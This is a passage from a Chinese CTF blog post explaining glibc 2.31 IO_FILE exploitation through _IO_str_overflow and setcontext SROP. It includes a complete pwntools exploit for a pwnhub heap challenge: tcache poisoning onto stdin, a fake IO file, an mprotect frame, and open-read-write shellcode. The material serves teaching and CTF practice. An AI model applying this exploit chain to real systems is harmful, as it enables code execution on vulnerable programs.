    fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到程序里面有malloc,memcpy,free等函数，并且参数我们都可以控制因此可以利用这一点来进行非预期的堆块申请释放和填充,而且我们看一下IO_str_overflow的汇编代码可以看到一个有意思的位置：</p>
<p>亦可以直接使用IDA查看libc-2.31.so搜索IO_str_overflow</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7e6eb20</span> &lt;__GI__IO_str_overflow&gt;:    repz nop edx</span><br><span class="line">   <span class="number">0x7ffff7e6eb24</span> &lt;__GI__IO_str_overflow+<span class="number">4</span>&gt;:    push   r15</span><br><span class="line">   <span class="number">0x7ffff7e6eb26</span> &lt;__GI__IO_str_overflow+<span class="number">6</span>&gt;:    push   r14</span><br><span class="line">   <span class="number">0x7ffff7e6eb28</span> &lt;__GI__IO_str_overflow+<span class="number">8</span>&gt;:    push   r13</span><br><span class="line">   <span class="number">0x7ffff7e6eb2a</span> &lt;__GI__IO_str_overflow+<span class="number">10</span>&gt;:    push   r12</span><br><span class="line">   <span class="number">0x7ffff7e6eb2c</span> &lt;__GI__IO_str_overflow+<span class="number">12</span>&gt;:    push   rbp</span><br><span class="line">   <span class="number">0x7ffff7e6eb2d</span> &lt;__GI__IO_str_overflow+<span class="number">13</span>&gt;:    mov    ebp,esi</span><br><span class="line">   <span class="number">0x7ffff7e6eb2f</span> &lt;__GI__IO_str_overflow+<span class="number">15</span>&gt;:    push   rbx</span><br><span class="line">   <span class="number">0x7ffff7e6eb30</span> &lt;__GI__IO_str_overflow+<span class="number">16</span>&gt;:    sub    rsp,<span class="number">0x28</span></span><br><span class="line">   <span class="number">0x7ffff7e6eb34</span> &lt;__GI__IO_str_overflow+<span class="number">20</span>&gt;:    mov    eax,DWORD PTR [rdi]</span><br><span class="line">   <span class="number">0x7ffff7e6eb36</span> &lt;__GI__IO_str_overflow+<span class="number">22</span>&gt;:    test   al,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x7ffff7e6eb38</span> &lt;__GI__IO_str_overflow+<span class="number">24</span>&gt;:    jne    <span class="number">0x7ffff7e6eca0</span> &lt;__GI__IO_str_overflow+<span class="number">384</span>&gt;</span><br><span class="line">   <span class="number">0x7ffff7e6eb3e</span> &lt;__GI__IO_str_overflow+<span class="number">30</span>&gt;:    mov    edx,eax</span><br><span class="line">   <span class="number">0x7ffff7e6eb40</span> &lt;__GI__IO_str_overflow+<span class="number">32</span>&gt;:    mov    rbx,rdi</span><br><span class="line">   <span class="number">0x7ffff7e6eb43</span> &lt;__GI__IO_str_overflow+<span class="number">35</span>&gt;:    <span class="keyword">and</span>    edx,<span class="number">0xc00</span></span><br><span class="line">   <span class="number">0x7ffff7e6eb49</span> &lt;__GI__IO_str_overflow+<span class="number">41</span>&gt;:    cmp    edx,<span class="number">0x400</span></span><br><span class="line">   <span class="number">0x7ffff7e6eb4f</span> &lt;__GI__IO_str_overflow+<span class="number">47</span>&gt;:    je     <span class="number">0x7ffff7e6ec80</span> &lt;__GI__IO_str_overflow+<span class="number">352</span>&gt;</span><br><span class="line">   <span class="number">0x7ffff7e6eb55</span> &lt;__GI__IO_str_overflow+<span class="number">53</span>&gt;:    mov    rdx,QWORD PTR [rdi+<span class="number">0x28</span>]  &lt;----     </span><br><span class="line">   <span class="number">0x7ffff7e6eb59</span> &lt;__GI__IO_str_overflow+<span class="number">57</span>&gt;:    mov    r14,QWORD PTR [rbx+<span class="number">0x38</span>]</span><br><span class="line">   <span class="number">0x7ffff7e6eb5d</span> &lt;__GI__IO_str_overflow+<span class="number">61</span>&gt;:    mov    r12,QWORD PTR [rbx+<span class="number">0x40</span>]</span><br><span class="line">   <span class="number">0x7ffff7e6eb61</span> &lt;__GI__IO_str_overflow+<span class="number">65</span>&gt;:    <span class="keyword">xor</span>    ecx,ecx</span><br><span class="line">   <span class="number">0x7ffff7e6eb63</span> &lt;__GI__IO_str_overflow+<span class="number">67</span>&gt;:    mov    rsi,rdx</span><br><span class="line">   <span class="number">0x7ffff7e6eb66</span> &lt;__GI__IO_str_overflow+<span class="number">70</span>&gt;:    sub    r12,r14</span><br><span class="line">   <span class="number">0x7ffff7e6eb69</span> &lt;__GI__IO_str_overflow+<span class="number">73</span>&gt;:    cmp    ebp,<span class="number">0xffffffff</span></span><br><span class="line">   <span class="number">0x7ffff7e6eb6c</span> &lt;__GI__IO_str_overflow+<span class="number">76</span>&gt;:    sete   cl</span><br><span class="line">   <span class="number">0x7ffff7e6eb6f</span> &lt;__GI__IO_str_overflow+<span class="number">79</span>&gt;:    sub    rsi,QWORD PTR [rbx+<span class="number">0x20</span>]</span><br><span class="line">   <span class="number">0x7ffff7e6eb73</span> &lt;__GI__IO_str_overflow+<span class="number">83</span>&gt;:    add    rcx,r12</span><br><span class="line">   <span class="number">0x7ffff7e6eb76</span> &lt;__GI__IO_str_overflow+<span class="number">86</span>&gt;:    cmp    rcx,rsi</span><br><span class="line">   <span class="number">0x7ffff7e6eb79</span> &lt;__GI__IO_str_overflow+<span class="number">89</span>&gt;:    ja     <span class="number">0x7ffff7e6ec4a</span> &lt;__GI__IO_str_overflow+<span class="number">298</span>&gt;</span><br><span class="line">   <span class="number">0x7ffff7e6eb7f</span> &lt;__GI__IO_str_overflow+<span class="number">95</span>&gt;:    test   al,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x7ffff7e6eb81</span> &lt;__GI__IO_str_overflow+<span class="number">97</span>&gt;:    jne    <span class="number">0x7ffff7e6ecc0</span> &lt;__GI__IO_str_overflow+<span class="number">416</span>&gt;</span><br><span class="line">   <span class="number">0x7ffff7e6eb87</span> &lt;__GI__IO_str_overflow+<span class="number">103</span>&gt;:    lea    r15,[r12+r12*<span class="number">1</span>+<span class="number">0x64</span>]</span><br></pre></td></tr></table></figure>

<p>可以看到在调用malloc之前的<strong>0x7ffff7e6eb55</strong>位置<strong>rdx</strong>被赋值为**[rdi+0x28]<strong>,而此时的rdi恰好指向我们伪造的IO_FILE_plus的头部，而在glibc2.29的版本上setcontext的利用从以前的rdi变为了rdx，因此我们可以通过这个位置来进行新版下的setcontext,进而实现</strong>srop**,具体做法是利用非预期地址填充将malloc_hook填充为setcontext，这样在我们进入io_str_overflow时首先会将rdx赋值为我们可以控制的地址，然后在后面malloc的时候会触发setcontext，而此时rdx已经可控，因此就可以成功实现srop<br> 综上可知参数对应关系为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0</span></span><br><span class="line">_IO_write_ptr = 用于srop的地址（此时同时满足了fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_buf_end - _IO_buf_base）</span><br><span class="line">new_buf = <span class="built_in">malloc</span>(<span class="number">2</span> * (_IO_buf_end - _IO_buf_base ) + <span class="number">100</span>)</span><br><span class="line"><span class="built_in">memcpy</span>(new_buf，_IO_buf_base，_IO_buf_end - _IO_buf_base)</span><br><span class="line"><span class="built_in">free</span>(_IO_buf_base)</span><br></pre></td></tr></table></figure>

<h3 id="个人总结2-31IO利用如下"><a href="#个人总结2-31IO利用如下" class="headerlink" title="个人总结2.31IO利用如下"></a>个人总结2.31IO利用如下</h3><p>通过large bin attack或者tcache attack或者unsorted bin attack，可以更改_IO_list_all，或者直接任意写到 _IO_2_1_stdout_，来伪造一个fake_io达到我们的目的，然后通过向malloc_hook写入setcontext+61；在2.31版本下，setcontext的参数从rdi变成了rdx；而在2.31下io_str_overflow汇编中在调用malloc前存在一个</p>
<p>mov rdx,QWORD PTR [rdi+0x28],而此时rdi正好指向我们构造的IO_FILE_plus，即是有将我们构造的IO_FILE_plus+0x28处指向我们的srop的地址。</p>
<h3 id="pwnhub公开赛一道题目为例"><a href="#pwnhub公开赛一道题目为例" class="headerlink" title="pwnhub公开赛一道题目为例"></a>pwnhub公开赛一道题目为例</h3><p><strong>moregrilfriends</strong></p>
<p>exp是直接用的这位<a target="_blank" rel="noopener" href="https://blog.mark0519.com/post/wp-PWNHUB%E5%85%AC%E5%BC%80%E8%B5%9Bgirl">师傅</a>的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./moregirlfriend&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"></span><br><span class="line">loacl = <span class="number">1</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> loacl:</span><br><span class="line">  p = process(<span class="string">&quot;./moregirlfriend&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="string">&quot;29242&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">idx</span>):</span></span><br><span class="line">  p.sendlineafter(<span class="string">&quot;wow:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">  choice(<span class="number">1</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">&quot;more one?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">  p.sendlineafter(<span class="string">&quot;Height?&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">  p.sendlineafter(<span class="string">&quot;girlfriend?&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">  choice(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">num,idx=[]</span>):</span></span><br><span class="line">  choice(<span class="number">2</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">&quot;leave you?&quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Which girlfriend?&quot;</span>,<span class="built_in">str</span>(idx[i]))</span><br><span class="line">  free()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ========[leak libc]===========</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x450</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x450</span>,<span class="string">&quot;1&quot;</span>) <span class="comment"># leave top chunk</span></span><br><span class="line">delete(<span class="number">1</span>,[<span class="number">0</span>])</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x450</span>,<span class="string">&quot;0&quot;</span>*<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">1</span>,[<span class="number">0</span>]) <span class="comment"># leak libc (unsortedbin bk)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;0&quot;</span>*<span class="number">8</span>)</span><br><span class="line">addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = addr-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span> - <span class="number">96</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base ==&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">delete(<span class="number">1</span>,[<span class="number">1</span>]) <span class="comment"># init bins</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># =========[UAF &amp; leak heap]=========</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>): <span class="comment"># chunk[0-10]</span></span><br><span class="line">    add(i,<span class="number">0x68</span>,<span class="built_in">str</span>(i)*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>,[<span class="number">1</span>,<span class="number">2</span>]) <span class="comment"># Full tcache</span></span><br><span class="line">delete(<span class="number">8</span>,[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">9</span>]) <span class="comment"># double free chunk[0]</span></span><br><span class="line"><span class="comment"># 2+8+1 = 11chunks = 7tcaches + 3fatsbins(loss chunk[8])</span></span><br><span class="line"><span class="comment"># fastbins: chunk[0]-&gt;chunk[9]-&gt;chunk[0]</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;9 has left you.&quot;</span>)</span><br><span class="line">heap = u64(p.recvuntil(<span class="string">&#x27;\x55&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) &gt;&gt; <span class="number">8</span></span><br><span class="line">heap_base = heap &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base ==&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># =========[get real addr]===========</span></span><br><span class="line">malloc_hook = libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">malloc_hook_base = malloc_hook &amp; <span class="number">0xFFFFFFFFF000</span></span><br><span class="line">setcontext = libc_base+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">mprotect = libc_base+libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">stdin = libc_base+libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">vtable = libc_base+<span class="number">0x1ED560</span> <span class="comment"># _IO_str_jumps</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># =========[Tcache Attack]===========</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># empty tcache</span></span><br><span class="line">  <span class="keyword">if</span> i == <span class="number">6</span>: <span class="comment"># fake size</span></span><br><span class="line">    add(<span class="number">6</span>,<span class="number">0x68</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x291</span>)) <span class="comment"># 0x290 = 0x60+0x70*5</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    add(i,<span class="number">0x68</span>,<span class="string">&quot;=&quot;</span>*<span class="number">0x20</span>+<span class="string">&quot;=[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]=&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x68</span>,p64(heap_base+<span class="number">0x320</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x68</span>,<span class="string">&quot;11&quot;</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x68</span>,<span class="string">&#x27;12&#x27;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x68</span>,<span class="string">&#x27;13&#x27;</span>) <span class="comment"># tcache don&#x27;t check chunk_size</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">CHUNK[13]</span></span><br><span class="line"><span class="string">0x0000000000000000  0x0000000000000071</span></span><br><span class="line"><span class="string">0x0000000000000000  0x0000000000000291 &lt;- CHUNK_PTR[6]</span></span><br><span class="line"><span class="string">0x0000000000003331  0x0000000000000000 &lt;- CHUNK_PTR[13]</span></span><br><span class="line"><span class="string">0x0000000000000000  0x0000000000000000</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x280</span>,<span class="string">&quot;14&quot;</span>)</span><br><span class="line">delete(<span class="number">3</span>,[<span class="number">14</span>,<span class="number">13</span>,<span class="number">6</span>])     </span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x68</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x291</span>)+p64(stdin))</span><br><span class="line"><span class="comment"># tcachebins</span></span><br><span class="line"><span class="comment"># 0x290 [  2]: chunk[13] —&gt; _IO_2_1_stdin_ </span></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x280</span>,<span class="string">&quot;13&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># =============[fake IO file]===============</span></span><br><span class="line"><span class="comment"># size = 0xe0</span></span><br><span class="line">fake_io = p64(<span class="number">0xfbad1800</span>) <span class="comment">#flag</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#_IO_read_ptr</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#_IO_read_end</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#_IO_read_base</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#_IO_write_base</span></span><br><span class="line">fake_io += p64(stdin+<span class="number">0xe0</span>) <span class="comment">#_IO_write_ptr (setcontext的参数rdx,使其指向 srop_mprotect)</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#_IO_write_end</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#_IO_buf_base</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#_IO_buf_end</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#_IO_save_base</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#_IO_backup_base</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#_IO_save_end</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#_markers </span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#_chain </span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#_fileno </span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#_flags2</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#_old_offset</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#_cur_column </span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#_vtable_offset</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#_shortbuf</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#_lock</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#_offset</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#_codecvt</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#_wide_data</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#_freeres_list</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#_freeres_buf</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) <span class="comment">#__pad5</span></span><br><span class="line">fake_io += p64(vtable) <span class="comment">#vtable -&gt; _IO_str_jumps</span></span><br><span class="line"></span><br><span class="line">srop_mprotect = SigreturnFrame()</span><br><span class="line">srop_mprotect.rsp = malloc_hook + <span class="number">0x8</span></span><br><span class="line">srop_mprotect.rdi = malloc_hook_base</span><br><span class="line">srop_mprotect.rsi = <span class="number">0x1000</span></span><br><span class="line">srop_mprotect.rdx = <span class="number">7</span></span><br><span class="line">srop_mprotect.rip = libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># read shellcode</span></span><br><span class="line">mpro = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov rsi,%d</span></span><br><span class="line"><span class="string">mov rdx,0x1000</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">jmp rsi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>%malloc_hook_base</span><br><span class="line"></span><br><span class="line">payload = fake_io + <span class="built_in">str</span>(srop_mprotect) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(setcontext + <span class="number">61</span>) + p64(malloc_hook + <span class="number">0x10</span>) + asm(mpro)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x288</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===========[get shell]============</span></span><br><span class="line">choice(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;you?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">10</span>)) <span class="comment">#执行exit(0),Begin ORW</span></span><br><span class="line">shellcode = shellcraft.amd64.<span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">shellcode += shellcraft.amd64.read(<span class="number">3</span>,malloc_hook_base,<span class="number">0x20</span>)</span><br><span class="line">shellcode += shellcraft.amd64.write(<span class="number">1</span>,malloc_hook_base,<span class="number">0x20</span>)</span><br><span class="line">p.sendline(asm(shellcode))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后附上参考文章的链接</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164558">GD师傅</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39153421/article/details/115327308">一梦不醒</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">LOLOLO</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://lololo-pwn.github.io/2021/11/23/IO-FILE/">https://lololo-pwn.github.io/2021/11/23/IO-FILE/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://lololo-pwn.github.io" target="_blank">菜鸡PWN</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a></div><div class="post_share"><div class="social-share" data-image="/img/bk.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/11/24/bins/"><img class="prev-cover" src="/img/bck.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">bins</div></div></a></div><div class="next-post pull-right"><a href="/2021/11/17/top-chunk%E7%9A%84%E4%B8%80%E7%A7%8D%E5%88%A9%E7%94%A8/"><img class="next-cover" src="/img/bck.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">top chunk的一种利用</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/11/24/bins/" title="bins"><img class="cover" src="/img/bck.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-24</div><div class="title">bins</div></div></a></div><div><a href="/2021/11/02/ciscn-s-1/" title="CISCN_S_1"><img class="cover" src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/write_up.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-02</div><div class="title">CISCN_S_1</div></div></a></div><div><a href="/2021/11/17/top-chunk%E7%9A%84%E4%B8%80%E7%A7%8D%E5%88%A9%E7%94%A8/" title="top chunk的一种利用"><img class="cover" 